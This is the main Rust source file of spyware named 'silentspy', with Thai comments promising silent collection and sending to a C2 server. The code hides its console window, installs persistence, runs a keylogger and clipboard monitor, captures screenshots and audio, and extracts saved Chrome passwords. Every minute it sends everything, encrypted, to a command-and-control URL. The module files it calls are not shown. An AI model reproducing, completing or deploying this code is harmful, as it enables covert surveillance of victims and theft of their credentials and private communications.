// silentspy.rs - Ultimate Spyware 2025 (Rust)
// เก็บข้อมูลทุกอย่าง + ส่งไป C2 แบบเงียบสุด ๆ

mod config;
mod keylogger;
mod clipboard;
mod screenshot;
mod audio;
mod passwords;
mod exfil;
mod persistence;

use std::sync::{Arc, Mutex};
use tokio::time::sleep;
use windows::Win32::UI::WindowsAndMessaging::ShowWindow;
use windows::Win32::UI::WindowsAndMessaging::SW_HIDE;
use windows::Win32::System::Console::GetConsoleWindow;
use chrono;
use whoami;

fn main() {
    let config = config::load_config();
    let encryption_key = config::parse_key(&config.c2.encryption_key);

    // ซ่อน console
    #[cfg(windows)]
    unsafe {
        let _ = ShowWindow(GetConsoleWindow(), SW_HIDE);
    }

    persistence::setup_persistence();

    let keylog = Arc::new(Mutex::new(String::new()));
    let clipboard_data = Arc::new(Mutex::new(String::new()));

    // Start threads
    keylogger::start_keylogger(Arc::clone(&keylog));
    clipboard::start_clipboard_monitor(Arc::clone(&clipboard_data));

    // Main loop
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(async {
        loop {
            let screenshot_b64 = screenshot::capture_screenshot();
            let location = serde_json::json!({ "lat": 13.7563, "lon": 100.5018 }).to_string();
            let audio_b64 = tokio::task::spawn_blocking(audio::record_audio).await.unwrap_or_else(|_| "".to_string());
            let passwords = passwords::get_chrome_passwords();

            let data = exfil::ExfilData {
                timestamp: chrono::Utc::now().timestamp() as u64,
                hostname: whoami::fallible::hostname().unwrap_or("unknown".to_string()),
                keylog: keylog.lock().unwrap().clone(),
                clipboard: clipboard_data.lock().unwrap().clone(),
                screenshot: screenshot_b64,
                location,
                audio: audio_b64,
                passwords,
            };

            exfil::exfil_data(data, &config.c2.url, &encryption_key).await;

            keylog.lock().unwrap().clear();
            sleep(std::time::Duration::from_secs(60)).await;
        }
    });
}